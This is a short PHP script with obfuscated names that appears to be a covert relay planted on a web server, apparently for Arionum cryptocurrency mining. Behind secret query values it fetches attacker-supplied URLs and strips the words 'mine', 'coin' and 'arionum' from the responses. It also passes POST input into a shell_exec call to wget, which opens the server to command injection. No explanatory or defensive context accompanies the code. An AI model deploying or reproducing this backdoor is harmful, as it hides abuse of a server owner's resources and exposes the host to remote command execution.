<?php

if($_GET["q"] == "")
  
{

}

if($_GET["q"] == "linux8474")
  
{

$linux84741274 = $_GET['url84'];

$linux1 = $_GET['id'];

$linux2 = $_GET['linux8'];

$linux3 = $_GET['linux12'];

$linux4 = $_GET['linux34'];

$linux5 = $_GET['linux48'];

$linux6 = $_GET['linux52'];

$google8474 = file_get_contents("$linux84741274/linux8474.php?q=linux8474&id=$linux1&linux8=$linux2&linux12=$linux3&linux48=$linux5&linux52=$linux6&linux34=$linux4");

$google8474 = preg_replace("/mine/","",$google8474);

$google8474 = preg_replace("/coin/","",$google8474);

$google8474 = preg_replace("/arionum/","",$google8474);

echo "$google8474";

}

if($_GET["q"] == "linux84")
  
{

$google84741 = $_POST["linux2"];

$google84741 = base64_encode($google84741);

$google84742 = $_POST["linux3"];

$google84742 = base64_encode($google84742);

$google84744 = $_POST["linux4"];

$google84744 = base64_encode($google84744);

$google847412 = $_POST["linux5"];

$google847412 = base64_encode($google847412);

$google847446 = $_POST["linux1"];

$google847446 = base64_encode($google847446);

$googlelinux84 = $_POST["url84"];

echo shell_exec("wget -q -U 'Mozille84' --post-data=linux2='" . $google84741 . "&linux3=" . $google84742 . "&linux5=" . $google847412 . "&linux1=" . $google847446 . "&linux4=" . $google84744 . "' '" . $googlelinux84 . "/linux8474.php?q=linux84' --header='Content-type: application/x-www-form-urlencoded'");

}

?>
